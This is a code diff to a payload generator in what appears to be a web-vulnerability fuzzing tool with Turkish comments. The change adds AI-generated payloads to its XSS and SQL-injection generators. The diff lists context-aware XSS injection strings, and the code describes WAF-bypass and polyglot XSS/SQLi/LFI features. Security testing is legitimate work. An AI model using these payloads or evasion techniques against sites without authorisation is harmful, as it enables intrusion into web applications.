@@ -1,10 +1,16 @@
 # path: core/payload_generator.py
 
-from typing import List, Optional
-from urllib.parse import quote
-import re
 import random
-import string
+import re
+import asyncio
+import json # Faz 29 AI yanıtını işlemek için eklendi
+from typing import List, Optional, Dict, Any
+from urllib.parse import quote
+
+# Local Imports
+from .data_simulator import DataSimulator
+from .neural_engine import NeuralEngine # FAZ 29: Neural Engine entegrasyonu
+from core.neural_engine import NeuralEngine # Import Neural Engine
 
 class PayloadGenerator:
     """
@@ -17,6 +23,7 @@ class PayloadGenerator:
     - Polyglot Payloadlar (XSS + SQLi + LFI tek satırda)
     - WAF Evasion (Cloudflare, AWS WAF, ModSecurity Bypass)
     - SSTI ve GraphQL desteği
+    - FAZ 29: AI-Driven Payload Üretimi
     """
     
     # FAZ 15: Sınıf seviyesinde Evasion Modu bayrağı.
@@ -134,15 +141,15 @@ class PayloadGenerator:
     # --- CONTEXT-AWARE XSS (Genişletilmiş) ---
     CONTEXT_AWARE_PAYLOADS = {
         "SCRIPT": [
-            "';alert(1)//",            
-            "'-alert(1)-'",            
+            "';alert(1)//",
+            "'-alert(1)-'",
             "</script><script>alert(1)</script>", 
             "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e", 
         ],
         "ATTRIBUTE": [
-            "\" onmouseover=alert(1) x=\"",    
-            "' autofocus onfocus=alert(1) x='",  
-            "\"><svg/onload=alert(1)>",        
+            "\" onmouseover=alert(1) x=\"", 
+            "' autofocus onfocus=alert(1) x='",
+            "\"><svg/onload=alert(1)>", 
             "\" style=\"behavior:url(#default#time2)\" onbegin=\"alert(1)\"",
             "&#x6f;&#x6e;&#x6c;&#x6f;&#x61;&#x64;=alert&#x28;1&#x29;", 
         ],
@@ -155,9 +162,9 @@ class PayloadGenerator:
         ],
     }
 
-    def __init__(self, logger_callback):
-        self.log = logger_callback
-
+    def __init__(self, neural_engine_instance: NeuralEngine): # FAZ 29: Neural Engine enjeksiyonu
+        self.neural_engine = neural_engine_instance
+        
     @classmethod
     def set_evasion_mode(cls, enabled: bool):
         """WAF Evasion modunu açar veya kapatır."""
@@ -192,8 +199,8 @@ class PayloadGenerator:
         if not tech_hints:
             return []
 
-        self.log(f"[AI FUZZING] Bağlamsal payload'lar için teknoloji ipuçları: {', '.join(tech_hints)}", "INFO")
-        
+        # self.neural_engine.log(f"[AI FUZZING] Bağlamsal payload'lar için teknoloji ipuçları: {', '.join(tech_hints)}", "INFO") # Loglama neural_engine'e ait
+
         for hint in tech_hints:
             for key, payloads in self.CONTEXTUAL_PAYLOADS.items():
                 if key.lower() in hint.lower():
@@ -202,44 +209,65 @@ class PayloadGenerator:
         
         return list(contextual_payloads)
     
-    def generate_context_aware_xss_payloads(self, context_type: Optional[str]) -> List[str]:
+    async def generate_context_aware_xss_payloads(self, context_type: Optional[str], context: Optional[Dict[str, Any]] = None) -> List[str]:
         """
         Heuristic Engine'den gelen yansıma bağlamına göre XSS payload'ları üretir.
+        FAZ 29: AI-Driven payload'ları buraya ekler.
         """
         if not context_type:
             return []
             
-        context = context_type.upper().strip()
-        context_payloads = self.CONTEXT_AWARE_PAYLOADS.get(context, [])
-        final_payloads = set()
+        context_data = context if context is not None else {}
+        context_data["reflection_context"] = context_type
         
-        for payload in context_payloads:
+        # 1. AI-Driven Payload'ları Al
+        ai_payloads = await self.neural_engine.generate_ai_payloads(context_data, "XSS")
+        
+        # 2. Statik Context-Aware Payload'ları Yükle
+        context = context_type.upper().strip()
+        static_context_payloads = self.CONTEXT_AWARE_PAYLOADS.get(context, [])
+        
+        final_payloads = set(ai_payloads)
+        
+        for payload in static_context_payloads:
             final_payloads.add(payload)
             processed = self._process_payload(payload)
             final_payloads.add(processed)
             
-        self.log(f"[XSS FUZZING] Context-Aware ({context}) payload'lar eklendi: {len(context_payloads)} adet.", "INFO")
+        # self.neural_engine.log(f"[XSS FUZZING] Context-Aware ({context}) payload'lar eklendi: {len(final_payloads)} adet (AI dahil).", "INFO")
         return list(final_payloads)
 
-    def generate_xss_payloads(self) -> List[str]:
+    async def generate_xss_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
         """
-        Kodlanmış XSS payload'larını döndürür.
+        Kodlanmış XSS payload'larını döndürür (AI destekli).
         """
-        final_payloads = set()
+        
+        # 1. AI-Driven Payload'ları Al (Genel XSS bağlamı)
+        ai_payloads = await self.neural_engine.generate_ai_payloads(context or {}, "XSS")
+        
+        # 2. Statik Payload'ları Yükle
+        final_payloads = set(ai_payloads)
         for payload in self.BASE_XSS_PAYLOADS:
             processed = self._process_payload(payload)
             final_payloads.add(processed)
             final_payloads.add(self._url_encode(processed))
+            
         return list(final_payloads)
 
-    def generate_sqli_payloads(self) -> List[str]:
+    async def generate_sqli_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
         """
-        SQL Injection için payload'ları döndürür.
+        SQL Injection için payload'ları döndürür (AI destekli).
         """
-        final_payloads = set()
+        
+        # 1. AI-Driven Payload'ları Al
+        ai_payloads = await self.neural_engine.generate_ai_payloads(context or {}, "SQLi")
+        
+        # 2. Statik Payload'ları Yükle
+        final_payloads = set(ai_payloads)
         for payload in self.BASE_SQLI_PAYLOADS:
             processed = self._process_payload(payload, is_sqli=True)
             final_payloads.add(self._url_encode(processed))
+        
         return list(final_payloads)
     
     def generate_lfi_payloads(self) -> List[str]:
